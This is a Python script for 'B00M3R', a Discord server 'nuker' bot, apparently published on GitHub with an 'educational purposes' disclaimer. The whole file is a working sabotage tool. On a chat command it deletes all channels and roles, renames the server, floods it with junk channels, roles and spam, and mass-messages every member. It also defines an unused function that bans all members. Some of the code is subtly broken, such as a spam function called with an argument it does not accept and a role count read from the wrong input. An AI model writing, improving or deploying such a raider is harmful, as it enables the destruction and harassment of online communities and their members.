#Python 3.8
#Disclaimer: B00M3R is a discord server raider developed by CR4SH3D for educational purposes
#By CR4SH3D (https://github.com/crashixx/B00M3R)

from os import system as sys
import discord
from discord.ext import commands
from pypresence import Presence

sys("color 4f")

#pypresence
rpc = Presence("933736221220433950")
rpc.connect()
rpc.update(state="by CR4SH3D",details="B00M3R",large_image="icon")


#title variables def
bot = discord.Client()
cmd='Undefined'
rname='Undefined'
sname='Undefined'
ch_name='Undefined'

#first def
def title():
    sys(f"title B00M3R   ¦   Server name: {sname}   ¦   Command: {cmd}   ¦   Channels Name: {ch_name}   ¦   Roles name: {rname}")
title()
def clear():
    sys("clear")

#base variables def
token = input(f"->Enter the bot token: ")
print("------------------------------------------")
sname = input("\nEnter the new server name here -> ")
cmd = input("\nEnter the bot realase command (!nuke, hello....) here -> ")
title()
spam = input("\nEnter your message to spam (in server) here ->")
nb_spam = input("\nEnter your message number (per channel) here ->")
mp = input("\nEnter your message to spam (in MP) here -> ")
ch_name = input("\nEnter the name of the channels to create (no maj) here -> ")
title()
ch_num = input("\nEnter the number of channels to create here -> ")
rname = input("\nEnter the name of the roles that will be created here -> ")
title()
nb_role = input("\nEnter the number of roles to be create here -> ")

title()
role_color = 0x000001


#raid tools def
def spam_member() :
    return f"""{mp}"""

async def delete_all_channels(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass


async def delete_all_roles(guild):
    for role in guild.roles:
        try:
            if role.name != "@everyone":
                await role.delete()
        except:
            pass

async def spam_members(guild):
    for member in guild.members:
        try:
            await member.send(spam_member(member.name))
        except:
            pass

async def create_roles(guild):
    for _ in range (int(nb_spam)):
        try:
            await guild.create_role(name = rname, colour= role_color)
        except:
            pass

async def ban_all_members(guild):
    for member in guild.members:
        try:
            await member.ban()
        except:
            pass

async def create_text_channels(guild):
    for _ in range(int(ch_num)):
        try:
            await guild.create_text_channel(name=ch_name)
        except:
            pass

async def spam_in_channels(guild):
    for _ in range(int(nb_spam)):
        try:
            for i in guild.channels:
                if str(i.type) != "voice":
                    await i.send(spam)
        except:
            pass
        
async def nuke(guild):
    await guild.edit(name=sname)
    await guild.edit(icon=None)
    await delete_all_roles(guild)
    await create_roles(guild)
    await delete_all_channels(guild)
    await spam_members(guild)
    await create_text_channels(guild)
    await spam_members(guild)
    await spam_in_channels(guild)

    
#Bot 
bot = discord.Client()

#Bot ready & presence
@bot.event
async def on_ready():
    sys("cls")
    print(f"B00M3R by CR4SH3D\n")
    print("Le bot est prêt !")

#Bot command 
@bot.event
async def on_message(message):
    guild = message.guild
    if message.content == cmd:
        await nuke(guild)


bot.run(token)

